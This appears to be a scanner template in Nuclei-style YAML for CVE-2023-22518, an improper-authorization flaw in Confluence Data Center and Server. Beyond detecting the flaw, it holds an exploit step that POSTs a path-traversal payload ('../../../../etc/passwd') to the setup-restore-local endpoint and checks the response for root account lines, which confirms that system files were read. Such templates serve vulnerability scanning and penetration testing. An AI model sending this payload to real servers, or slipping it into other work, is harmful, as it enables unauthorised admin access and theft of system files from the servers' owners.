id: cve-2023-22518
info:
  name: Confluence Improper Authorization
  author: FerzDevZ
  severity: critical
  description: Improper authorization in Confluence Data Center and Server allows unauthenticated admin access.
requests:
  - method: GET
    path:
      - "/json/setup-restore.action"
    matchers:
      - type: status
        status: [200]
exploit:
  steps:
    - method: POST
      path: "/json/setup-restore-local.action"
      body: "fileName=../../../../etc/passwd"
      matchers:
        - type: word
          words: ["root:x:0:0:"]
